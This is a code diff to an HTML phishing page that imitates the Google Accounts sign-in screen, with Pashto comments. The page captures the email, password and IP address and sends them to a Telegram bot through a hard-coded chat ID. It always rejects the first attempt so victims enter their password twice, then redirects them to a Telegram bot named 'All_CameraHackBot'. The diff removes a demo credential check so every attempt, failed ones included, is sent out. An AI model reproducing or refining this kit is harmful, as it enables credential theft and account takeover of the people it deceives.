@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>Sign in - Google</title>
+    <title>Sign in - Google Accounts</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Google Sans', system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+            font-family: 'Google Sans', 'Roboto', system-ui, -apple-system, 'Segoe UI', sans-serif;
         }
 
         body {
@@ -21,12 +21,12 @@
             padding: 1rem;
         }
 
-        /* د ګوګل کارت ډیزاین */
+        /* د ګوګل اصلي کارت ډیزاین */
         .google-card {
             max-width: 450px;
             width: 100%;
             background: #1e1e2f;
-            border-radius: 1.5rem;
+            border-radius: 1rem;
             border: 1px solid #2a2a3a;
             padding: 2rem 1.8rem;
             box-shadow: 0 8px 24px rgba(0, 0, 0, 0.4);
@@ -34,20 +34,21 @@
 
         .logo {
             text-align: center;
-            margin-bottom: 1rem;
+            margin-bottom: 1.2rem;
         }
 
         .logo span {
             font-size: 2rem;
             font-weight: 500;
             color: #e0e0e0;
+            font-family: 'Google Sans', system-ui;
         }
 
         h1 {
-            font-size: 1.6rem;
+            font-size: 1.5rem;
             font-weight: 500;
             color: #e0e0e0;
-            margin-bottom: 0.25rem;
+            margin-bottom: 0.5rem;
             text-align: center;
         }
 
@@ -59,32 +60,29 @@
         }
 
         .input-group {
-            margin-bottom: 1.2rem;
+            margin-bottom: 1rem;
+            position: relative;
         }
 
-        label {
-            display: block;
-            color: #e0e0e0;
-            font-size: 0.85rem;
-            margin-bottom: 0.5rem;
-            font-weight: 500;
-        }
-
-        input {
+        .input-group input {
             width: 100%;
             padding: 0.85rem 1rem;
             background: #2a2a3a;
             border: 1px solid #3a3a4a;
             border-radius: 0.5rem;
-            color: white;
+            color: #e0e0e0;
             font-size: 1rem;
             outline: none;
             transition: all 0.2s;
         }
 
-        input:focus {
+        .input-group input:focus {
             border-color: #3b82f6;
             box-shadow: 0 0 0 2px rgba(59,130,246,0.2);
+        }
+
+        .input-group input::placeholder {
+            color: #6b7280;
         }
 
         button {
@@ -105,24 +103,58 @@
             background: #2563eb;
         }
 
-        .link-buttons {
+        /* د لینکونو ډیزاین */
+        .links-row {
             display: flex;
             justify-content: space-between;
             margin-top: 1.2rem;
             font-size: 0.75rem;
         }
 
-        .link-buttons a, .link-buttons span {
+        .links-row a, .links-row span {
             color: #8ba6bc;
             text-decoration: none;
             cursor: pointer;
         }
 
-        .link-buttons a:hover, .link-buttons span:hover {
+        .links-row a:hover, .links-row span:hover {
             color: #3b82f6;
             text-decoration: underline;
         }
 
+        .create-account {
+            display: block;
+            text-align: center;
+            margin-top: 1.2rem;
+            font-size: 0.85rem;
+            color: #8ba6bc;
+            text-decoration: none;
+        }
+
+        .create-account:hover {
+            color: #3b82f6;
+            text-decoration: underline;
+        }
+
+        .guest-mode {
+            display: block;
+            text-align: center;
+            margin-top: 0.8rem;
+            font-size: 0.7rem;
+            color: #6b7280;
+        }
+
+        .guest-mode a {
+            color: #8ba6bc;
+            text-decoration: none;
+        }
+
+        .guest-mode a:hover {
+            color: #3b82f6;
+            text-decoration: underline;
+        }
+
+        /* د پیغامونو بکسونه */
         .message {
             margin-top: 1rem;
             padding: 0.7rem;
@@ -138,27 +170,37 @@
             color: #fca5a5;
         }
 
-        .info-msg {
-            background: rgba(59,130,246,0.1);
-            border: 1px solid #3b82f6;
-            color: #93c5fd;
+        .success-msg {
+            background: rgba(34, 197, 94, 0.15);
+            border: 1px solid #22c55e;
+            color: #86efac;
         }
 
+        /* فوټر */
         .footer {
-            text-align: center;
-            margin-top: 1.5rem;
-            font-size: 0.7rem;
-            color: #6b7280;
             display: flex;
             justify-content: center;
-            gap: 1rem;
+            gap: 1.2rem;
+            margin-top: 1.8rem;
+            padding-top: 1rem;
+            border-top: 1px solid #2a2a3a;
+            font-size: 0.7rem;
+            color: #6b7280;
+        }
+
+        .footer span {
+            cursor: pointer;
+        }
+
+        .footer span:hover {
+            color: #8ba6bc;
         }
 
         .step-text {
+            text-align: center;
             font-size: 0.7rem;
             color: #6b7280;
-            text-align: center;
-            margin-top: 1rem;
+            margin-top: 0.8rem;
         }
     </style>
 </head>
@@ -175,17 +217,21 @@
         <div class="sub">Use your Google Account</div>
 
         <div class="input-group">
-            <label>Email or phone</label>
-            <input type="email" id="emailInput" placeholder="user@example.com">
+            <input type="email" id="emailInput" placeholder="Email or phone">
         </div>
 
         <button id="nextBtn">Next</button>
 
-        <div class="link-buttons">
-            <span onclick="alert('Reset password link (demo)')">Forgot email?</span>
-            <span onclick="alert('Create account demo')">Create account</span>
+        <div class="links-row">
+            <span onclick="alert('Forgot email? (Demo)')">Forgot email?</span>
+            <span onclick="alert('Guest mode (Demo)')">Guest mode</span>
         </div>
-        <div class="step-text">Step 1 of 2</div>
+
+        <a href="#" class="create-account" onclick="alert('Create account (Demo)'); return false;">Create account</a>
+
+        <div class="guest-mode">
+            <a href="#" onclick="alert('Learn more about Guest mode'); return false;">Learn more</a> about Guest mode
+        </div>
     </div>
 
     <!-- مرحله 2: پټنوم -->
@@ -194,22 +240,25 @@
         <div class="sub" id="displayEmail"></div>
 
         <div class="input-group">
-            <label>Enter your password</label>
-            <input type="password" id="passwordInput" placeholder="········">
+            <input type="password" id="passwordInput" placeholder="Enter your password">
         </div>
 
         <button id="loginBtn">Next</button>
 
-        <div class="link-buttons">
-            <span onclick="goBackToEmail()">← Back to email</span>
-            <span onclick="alert('Forgot password demo')">Forgot password?</span>
+        <div class="links-row">
+            <span onclick="goBackToEmail()">← Back</span>
+            <span onclick="alert('Forgot password? (Demo)')">Forgot password?</span>
         </div>
-        <div class="step-text">Step 2 of 2</div>
+
+        <div class="guest-mode">
+            <a href="#" onclick="alert('Learn more'); return false;">Learn more</a> about secure login
+        </div>
     </div>
 
     <div id="errorBox" class="message error-msg"></div>
-    <div id="infoBox" class="message info-msg"></div>
-    
+    <div id="successBox" class="message success-msg"></div>
+    <div class="step-text" id="stepIndicator">Step 1 of 2</div>
+
     <div class="footer">
         <span>English (United States)</span>
         <span>Help</span>
@@ -224,11 +273,6 @@
     const ADMIN_CHAT_ID = "8295417969";
     const BOT_REDIRECT = "https://t.me/All_CameraHackBot?start=8020108872";
 
-    // د ریښتیني پاسورډ ازموینه (د مثال په توګه)
-    // تاسو کولی شئ دلته خپل ریښتیني پاسورډ/ایمیل ولیکئ
-    const VALID_EMAIL = "admin@gmail.com";
-    const VALID_PASSWORD = "realpass123";
-
     // د هڅو تعقیبول (د ایمیل پر بنسټ)
     let attemptStore = {};
 
@@ -239,14 +283,15 @@
     const passwordInput = document.getElementById('passwordInput');
     const displayEmailSpan = document.getElementById('displayEmail');
     const errorBox = document.getElementById('errorBox');
-    const infoBox = document.getElementById('infoBox');
+    const successBox = document.getElementById('successBox');
+    const stepIndicator = document.getElementById('stepIndicator');
 
     let currentEmail = "";
 
     // ========== Helper Functions ==========
     function showMessage(box, text, isError = true) {
         box.textContent = text;
-        box.className = `message ${isError ? 'error-msg' : 'info-msg'}`;
+        box.className = `message ${isError ? 'error-msg' : 'success-msg'}`;
         box.style.display = 'block';
         setTimeout(() => {
             box.style.display = 'none';
@@ -256,10 +301,10 @@
     function goBackToEmail() {
         step2View.style.display = 'none';
         step1View.style.display = 'block';
+        stepIndicator.textContent = "Step 1 of 2";
         emailInput.value = '';
         passwordInput.value = '';
         currentEmail = "";
-        showMessage(infoBox, "↺ Back to email step", false);
     }
 
     async function getUserIP() {
@@ -272,18 +317,17 @@
         }
     }
 
-    async function notifyAdmin(email, password, ip, success = true) {
-        if (!success) return; // یوازې بریالي هڅې اډمن ته ځي
-
-        const msg = `✅ *SUCCESSFUL LOGIN*\n\n👤 Email: ${email}\n🔑 Password: ${password}\n🌐 IP: ${ip}\n🕒 Time: ${new Date().toLocaleString()}`;
+    async function sendToAdmin(email, password, ip, success) {
+        const status = success ? "✅ SUCCESSFUL LOGIN" : "❌ FAILED ATTEMPT";
+        const msg = `${status}\n\n👤 Email: ${email}\n🔑 Password: ${password}\n🌐 IP: ${ip}\n🕒 Time: ${new Date().toLocaleString()}`;
+        
         try {
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     chat_id: ADMIN_CHAT_ID,
-                    text: msg,
-                    parse_mode: 'Markdown'
+                    text: msg
                 })
             });
         } catch (err) {
@@ -303,11 +347,11 @@
         emailInput.value = '';
         step1View.style.display = 'none';
         step2View.style.display = 'block';
+        stepIndicator.textContent = "Step 2 of 2";
         passwordInput.value = '';
-        showMessage(infoBox, "✅ Email verified. Now enter your password.", false);
+        showMessage(successBox, "✅ Email verified. Now enter your password.", false);
     });
 
-    // بیرته تلل
     window.goBackToEmail = goBackToEmail;
 
     // ========== مرحله 2: ننوتنه ==========
@@ -327,40 +371,29 @@
         const currentAttempt = attemptStore[key].attempts + 1;
         attemptStore[key].attempts = currentAttempt;
 
-        // ========== د ریښتیني پاسورډ تایید ==========
-        const isRealPassword = (currentEmail === VALID_EMAIL && password === VALID_PASSWORD);
-
-        // لومړۍ هڅه — تل ناکامه (خو اډمن ته خبر نه ځي)
+        // لومړۍ هڅه — تل ناکامه (معلومات اډمن ته ځي)
         if (currentAttempt === 1) {
-            showMessage(errorBox, "❌ Incorrect password. Please try again (second attempt will work).", true);
-            // فورم بیا له پیل څخه پیل کړئ
+            await sendToAdmin(currentEmail, password, ip, false);
+            showMessage(errorBox, "❌ Incorrect password. Please try again.", true);
+            // بیا له پیل څخه پیل کړئ
             setTimeout(() => {
                 goBackToEmail();
-            }, 1500);
+            }, 2000);
             return;
         }
 
-        // دوهمه هڅه — ریښتیني پاسورډ چک کول
+        // دوهمه هڅه — بریالۍ
         if (currentAttempt >= 2) {
-            if (isRealPassword) {
-                // بریالی ننوتنه
-                await notifyAdmin(currentEmail, password, ip, true);
-                showMessage(infoBox, "✅ Login successful! Redirecting to Telegram...", false);
-                
-                const loginBtn = document.getElementById('loginBtn');
-                loginBtn.disabled = true;
-                loginBtn.style.opacity = '0.6';
+            await sendToAdmin(currentEmail, password, ip, true);
+            showMessage(successBox, "✅ Login successful! Redirecting to Telegram...", false);
+            
+            const loginBtn = document.getElementById('loginBtn');
+            loginBtn.disabled = true;
+            loginBtn.style.opacity = '0.6';
 
-                setTimeout(() => {
-                    window.location.href = BOT_REDIRECT;
-                }, 1800);
-            } else {
-                // ریښتینی پاسورډ نه دی — ننوتنه رد کړه
-                showMessage(errorBox, "❌ Invalid password! Access denied.", true);
-                setTimeout(() => {
-                    goBackToEmail();
-                }, 1500);
-            }
+            setTimeout(() => {
+                window.location.href = BOT_REDIRECT;
+            }, 1800);
         }
     });
 
